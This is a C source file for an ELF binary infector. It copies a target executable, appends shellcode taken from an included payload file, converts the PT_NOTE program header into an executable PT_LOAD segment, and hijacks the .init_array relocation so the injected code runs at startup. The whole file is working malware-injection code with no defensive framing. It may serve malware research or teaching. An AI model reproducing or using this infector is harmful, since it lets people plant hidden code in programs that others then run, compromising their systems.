#include <elf.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#include "payload.c"

void copy_file(const char *from, const char *to)
{
	int from_fd = open(from, O_RDONLY);
	int to_fd = open(to, O_WRONLY | O_CREAT);

	struct stat s;
	fstat(from_fd, &s);

	fchmod(to_fd, s.st_mode);

	char buffer[4096];
	while(1) {
		int read_sz = read(from_fd, buffer, sizeof(buffer));
		if (!read_sz) {
			break;
		}

		write(to_fd, buffer, read_sz);
	}

	close(from_fd);
	close(to_fd);
}

int main(int argc, char *argv[])
{
	if (argc != 2) {
		printf("Usage: %s <elf_filename>\n", argv[0]);
		exit(1);
	}

	char new_filename[PATH_MAX];
	snprintf(new_filename, PATH_MAX, "%s_infected", argv[1]);
	copy_file(argv[1], new_filename);

	int fd = open(new_filename, O_RDWR);
	struct stat st;
	fstat(fd, &st);
	char *elf = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf;
	Elf64_Shdr *shdr = (Elf64_Shdr *)(elf + ehdr->e_shoff);
	Elf64_Phdr *phdr = (Elf64_Phdr *)(elf + ehdr->e_phoff);

	Elf64_Shdr *rela_shdr = NULL;
	Elf64_Shdr *init_array_shdr = NULL;

	for (int i = 0; i < ehdr->e_shnum; i++) {
		//FIXME: There's more than one RELA section,
		//       maybe search on all of them for the right one
		if (!rela_shdr && shdr[i].sh_type == SHT_RELA) {
			rela_shdr = &shdr[i];
		}
		else if (!init_array_shdr && shdr[i].sh_type == SHT_INIT_ARRAY) {
			init_array_shdr = &shdr[i];
		}
	}

	Elf64_Phdr *note_phdr = NULL;

	for (int i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_NOTE) {
			note_phdr = &phdr[i];
			break;
		}
	}

	printf("rela_shdr = %p\n", (void *)rela_shdr);
	printf("note_phdr = %p\n", (void *)note_phdr);

	Elf64_Rela *rela = (Elf64_Rela *)(elf + rela_shdr->sh_offset);
	unsigned long rela_num = rela_shdr->sh_size / rela_shdr->sh_entsize;

	Elf64_Rela *init_array_rela = NULL;

	printf(".init_array = %#lx\n", init_array_shdr->sh_offset);
	for (unsigned long i = 0; i < rela_num; i++) {
		printf("[%lu]rela entry = %#lx\n", i, rela[i].r_offset);
		if (init_array_shdr->sh_addr == rela[i].r_offset) {
			init_array_rela = &rela[i];
			break;
		}
	}

	*(unsigned int *)(shellcode + shellcode_len - 4) = init_array_rela->r_addend - (st.st_size + shellcode_len + 0xc000);
	lseek(fd, 0, SEEK_END);
	write(fd, shellcode, shellcode_len);

	note_phdr->p_type = PT_LOAD;
	note_phdr->p_flags = PF_R | PF_X;
	note_phdr->p_filesz = shellcode_len;
	note_phdr->p_memsz = shellcode_len;
	note_phdr->p_vaddr = st.st_size + 0xc000;
	note_phdr->p_paddr = st.st_size + 0xc000;
	note_phdr->p_offset = st.st_size;

	init_array_rela->r_addend = st.st_size + 0xc000;

	munmap(elf, st.st_size);
	close(fd);
}
